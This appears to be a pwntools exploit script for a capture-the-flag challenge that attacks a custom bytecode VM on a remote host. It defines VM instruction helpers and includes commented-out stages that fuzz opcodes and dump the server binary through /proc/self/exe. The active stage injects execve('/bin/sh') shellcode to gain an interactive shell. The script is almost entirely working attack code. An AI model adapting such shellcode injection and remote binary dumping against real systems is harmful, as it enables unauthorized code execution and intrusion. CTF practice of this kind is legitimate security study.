#!/usr/bin/env python
from pwn import *
import time

context.log_level = "CRITICAL"
context.terminal = ["tmux", "splitw", "-h"]
context.arch = "amd64"

gdbscript = """
b *0x555555556110
b *0x555555556067
"""

# spam opcodes
# for i in range(0x100):
#     p = remote("traz-1.play.hfsc.tf", 10101)
#     p.recv()
#     p.sendline(p8(i))
#     p.recvuntil(b"p00p:\x1b[0m ")
#     data = p.recv().strip()
#     if b"invalid instruction" not in data:
#         print(p8(i), "-->", data)
#     p.close()

def getRegValue(reg):
    if reg == 'A':
        return 0x1
    
    if reg == 'B':
        return 0x2

    if reg == 'C':
        return 0x4

    if reg == 'D':
        return 0x8
    
    if reg == 'F':
        return 0x10
    
def getSys(sys):
    if 'open' == sys:
        return 1
    if 'read' == sys:
        return 2
    if 'write' == sys:
        return 4
    if 'sendfile' == sys:
        return 8

def imm(reg, value):
    return p8(1) + p8(value) + p8(getRegValue(reg))

def add(dest, src):
    return p8(2) + p8(getRegValue(src)) + p8(getRegValue(dest))

def mov(dest, src):
    return p8(4) + p8(getRegValue(src)) + p8(getRegValue(dest))

def  syscall(sys, arg):
    return p8(0x80) + p8(arg) + p8(getSys(sys))

def debug():
    return p8(0x40) + p8(0) + p8(0)

def store_string(buffer, addr):
    mem = addr
    sc = b''

    for i in list(buffer):
        sc += imm('A', ord(i))
        sc += imm('B', mem)
        sc += mov('B', 'A')
        mem += 1
    return sc

p = remote("traz-1.play.hfsc.tf", 10101)
# p = process("./chall")
# p = gdb.debug("./chall", aslr=False, gdbscript=gdbscript)

# Stage 1: read files
# payload = [
#     store_string('/proc/self/exe', 0),
#     imm('A', 0x0),
#     imm('B', 0x0),
#     syscall('open', 0x2),
#     syscall('sendfile', 1),
#     debug(),
# ]
# sc = b''.join(payload)


# Stagge 2: read shellcode
payload = b"\xff\x20\x20"
payload += b"\x00\x00\x02"
payload += b"\x00\x00\x01"
sc = payload

# send traz code
p.recv()
p.sendline(sc)

time.sleep(1)

# unlock this while executing stage 2 payload
shellcode = asm(shellcraft.execve("/bin/sh", 0, 0))
p.sendline(shellcode)


# dump the binary to a file, from stage 1
# p.recvuntil(b"> ")
# elf = p.recvuntil(b"------- [DEBUG] --------\n")[:-1*len("------- [DEBUG] --------\n")]
# # elf += p.recvuntil(b"------- [DEBUG] --------")[:-1*len("------- [DEBUG] --------")]
# with open("./chall", 'wb') as b:
#     b.write(elf)

p.interactive()
